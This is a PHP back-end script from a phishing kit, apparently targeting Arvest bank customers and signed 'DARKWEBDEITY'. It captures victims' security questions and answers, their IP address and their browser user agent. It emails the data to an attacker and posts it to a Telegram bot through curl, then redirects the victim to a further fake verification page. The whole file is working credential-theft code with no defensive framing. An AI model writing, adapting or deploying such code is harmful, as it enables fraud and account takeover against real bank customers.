<?php
session_start();
include("settings.php");

// validate login


    //collect info
    $q1 = $_POST['q1'];
    $a1 = $_POST['a1'];
    $q2 = $_POST['q2'];
    $a2 = $_POST['a2'];
    $q3 = $_POST['q3'];
    $a3 = $_POST['a3'];

    $message="------ 😈😈ARVEST BY DARKWEBDEITY 😈😈 ------\n";
    $message.="======SECURITY  QUESTIONS ========\n";
    $message.="Question 1: ".$q1."\n";
    $message.="Answer 1: ".$a1."\n";
    $message.="Question 2: ".$q2."\n";
    $message.="Answer 2: ".$a2."\n";
    $message.="Question 3: ".$q3."\n";
    $message.="Answer 3: ".$a3."\n";
    $message.="IP ADDR: ".$_SERVER['REMOTE_ADDR']." \n";
    $message.="USER AGENT: ".$_SERVER['HTTP_USER_AGENT']." \n";
    $message.="==========================\n";

    //send email
    mail($mail, "Login Info", $message);

    //send telegram
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".$telegram_bot_token."/sendMessage");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id=".$telegram_chat_id."&text=".$message);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);


        header('Location: ../email_verification.php');
      

